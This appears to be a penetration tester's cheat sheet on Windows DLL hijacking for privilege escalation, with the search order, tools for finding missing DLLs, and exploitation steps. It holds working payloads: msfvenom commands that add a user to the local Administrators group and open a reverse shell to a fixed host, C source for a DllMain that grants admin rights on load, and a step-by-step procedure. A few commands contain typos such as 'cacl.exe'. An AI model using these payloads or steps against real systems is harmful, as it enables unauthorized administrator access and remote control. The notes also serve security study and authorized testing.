[ExploitDb](https://www.exploit-db.com/exploits/14748)

DLL hijacking is a common technique used to escalate privileges on windows system when services or applications attempt to load a non-existent or improperly specified DLL. if an attacker can place a malicious DLL in a directory that gets searched first, the application will execute the attacker's code.

### DLL Search Order on Windows

when a process starts and attempts to load a DLL without a full path, windows searches in the following order:

1.  The directory from which the application was loaded (IMP)
2.  ``C:\Windows\System32``
3.  ``C:\Windows\System``
4.  ``C:\Windows``
5.  The current working Directory
6.  Directories listed in the ``PATH`` variable (IMP)

---

### Tools for DLL Hijacking

#### Process monitor (Sysinternals)


[Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

**Setup a Dilter (Ctrl + L)**

*   Result -> is -> ``NAME NOT FOUND`` -> include
*   Path -> ends with -> ``.dll`` -> include

Helps detect which DLLs are being searched and not found(missing)

#### Rattler (DLL hijack Finder)

*    A tool **sensepost** to automate the discovery of DLL hijack opportunities.

---

### Generating Malicious DLLs with ``msfvenom``

#### Open Paint

```bash
msfvenom -p windows/exec CMD='mspaint' -f dll > 1.dll
```

#### Open Calculator

```bash
msfvenom -p windows/exec CMD=cacl.exe -f dll > 1.dll
```

#### Add User to Administrator Group

```bash
msfvenom -p windows/exec CMD='net localgroup administrators DevNull /add' -f dll > 1.dll
```

#### Reverse Shell Payload

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.29.218 LPORT=43 -f dll > 1.dll
```

---

### Manual DLL Creation

``windows_dll.c``

```C
//Set x64 compile with : x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
//Set x32 compile with : i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved) {
    if( dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators rahul /add");
    }
    return TRUE;
}
```


--- 

### Exploitation Steps

1.  **Identify missing DLLs** using **Process Monitor** or similar tool.
2.  **Verify write access** to the directory where the DLL is expected.
3.  **Generate malicious DLL** using ``msfvenom`` or a custom payload.
4.  **Place he DLL** in the vulnerable directory.
5.  **Trigger the process or reboot** the system to execute the DLL.